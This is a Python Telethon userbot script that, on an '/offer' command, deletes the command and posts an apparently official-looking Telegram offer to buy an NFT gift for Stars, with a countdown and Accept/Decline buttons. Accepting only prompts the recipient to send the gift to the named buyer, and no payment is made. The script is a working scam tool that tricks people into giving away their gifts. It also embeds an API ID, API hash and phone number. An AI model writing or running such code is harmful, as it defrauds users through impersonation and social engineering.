"""
Userbot с готовой сессией.
"""

import os
import re
import asyncio
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button

API_ID = int(os.environ.get("API_ID", "39450533"))
API_HASH = os.environ.get("API_HASH", "52a50527f3fd4d9c1cba720590e618fe")
PHONE = os.environ.get("PHONE", "+380930034779")
BUYER = os.environ.get("BUYER", "legitimy")
SESSION = "session"

print("Импорт завершён", flush=True)

client = TelegramClient(SESSION, API_ID, API_HASH)
offer_expiry = {}


def parse_gift(text: str):
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return None
    name, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    stars = 7000
    for match in re.finditer(r'\b(\d{3,7})\b', text):
        val = int(match.group(1))
        if str(val) != num and 100 <= val <= 1000000:
            stars = val
            break
    slug = f"{name}-{num}"
    return {
        "gift_name": f"{gift_name} #{num}",
        "link": f"https://t.me/nft/{slug}",
        "stars": stars
    }


def format_remaining(expiry: datetime) -> str:
    now = datetime.utcnow()
    if expiry <= now:
        return "0ч 0м"
    delta = expiry - now
    mins = int(delta.total_seconds() // 60)
    return f"{mins // 60}ч {mins % 60}м"


def build_offer(gift, stars, remaining):
    return (
        f"{gift['link']}\n\n"
        f"Пользователь {BUYER} предлагает Вам {stars} Stars за подарок {gift['gift_name']}.\n\n"
        f"Предложение действует ещё {remaining}."
    )


@client.on(events.NewMessage(outgoing=True, pattern=r'(?i)^/offer'))
async def on_offer(event):
    gift = parse_gift(event.raw_text)
    if not gift:
        await event.reply("Формат: /offer https://t.me/nft/... 5000")
        return
    expiry = datetime.utcnow() + timedelta(hours=6)
    offer_expiry[event.chat_id] = expiry
    remaining = format_remaining(expiry)
    await event.respond(
        build_offer(gift, gift["stars"], remaining),
        buttons=[[Button.inline("✗ Отклонить", b"dec"), Button.inline("✓ Принять", b"acc")]]
    )
    await event.delete()


@client.on(events.CallbackQuery)
async def on_cb(event):
    if event.data == b"dec":
        await event.edit("Предложение отклонено.", buttons=None)
        await event.answer("Отклонено")
    elif event.data == b"acc":
        await event.edit(
            "Предложение о продаже успешно принято.\n\nПередайте подарок покупателю.",
            buttons=[[Button.url("Передать", f"tg://send_gift?to={BUYER}")]]
        )
        await event.answer("Принято")


async def main():
    print("СТАРТ", flush=True)
    print("Подключаюсь по сессии...", flush=True)
    await client.start()
    print("Userbot запущен.", flush=True)
    await client.run_until_disconnected()


if __name__ == "__main__":
    print("Запуск main", flush=True)
    asyncio.run(main())
